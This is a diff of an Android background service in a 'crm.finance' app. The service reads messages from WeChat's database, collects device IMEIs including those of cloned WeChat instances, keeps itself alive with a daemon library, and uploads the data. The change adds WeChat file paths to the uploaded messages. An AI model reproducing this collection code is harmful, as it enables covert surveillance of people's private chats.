@@ -20,6 +20,7 @@ import android.util.Log;
 import com.crm.finance.dao.DevInfoDao;
 import com.crm.finance.dao.HeartCofigDao;
 import com.crm.finance.dao.ImgFlagDao;
+import com.crm.finance.dao.MessageDao;
 import com.crm.finance.dao.RcontactDao;
 import com.crm.finance.dao.UserInfoDao;
 import com.crm.finance.util.Common;
@@ -31,7 +32,9 @@ import com.crm.finance.util.MyLog;
 import com.crm.finance.util.OkHttpUtil;
 import com.crm.finance.util.ShareData;
 import com.crm.finance.util.UploadManager;
+import com.crm.finance.util.Utils;
 import com.crm.finance.util.WXDataFormJsonUtil;
+import com.crm.finance.util.wxutil.WXFileUtil;
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
 import com.marswin89.marsdaemon.MyApplication1;
@@ -75,11 +78,6 @@ public class GohnsonService extends Service {
 
     private final static String TAG = GohnsonService.class.getSimpleName();
 
-    private List<String> lstFile = new ArrayList<String>();  //结果 List
-
-    //FTP工具类
-    private FTPUtils ftpUtils = null;
-
     private String wxIMEI = "";
     private String wxIMEI1 = "";//微信分身
     private String parallelLiteIMEI = "";
@@ -92,6 +90,7 @@ public class GohnsonService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         LogInputUtil.e(TAG, "GohnsonService 启动");
         initIMEI();
+        MyLog.init(MyApplication1.getApp().getCacheDir().getPath());
 
         CrashReport.initCrashReport(getApplicationContext(), GlobalCofig.BUGLY_ID, GlobalCofig.BUGLY_ISDEBUG);
 
@@ -455,6 +454,8 @@ public class GohnsonService extends Service {
             LogInputUtil.e(TAG, "第" + i + "次查询message表");
             boolean dataUploadSucceed = false;
             ArrayList<Object> messages = WXDataFormJsonUtil.getMessageDataInDB(this, dataTarget, file);
+            messages =  WXFileUtil.addSrcPath(wxFolderPath,messages);
+
             if (messages == null) continue;
             int listSize = messages.size();
             if (listSize > 0) {
@@ -480,6 +481,7 @@ public class GohnsonService extends Service {
             pushHearBeat();
         }
     }
+
 
 
     public void GetUIMs(String Path, String fileName, boolean IsIterative)  //搜索目录，扩展名，是否进入子文件夹
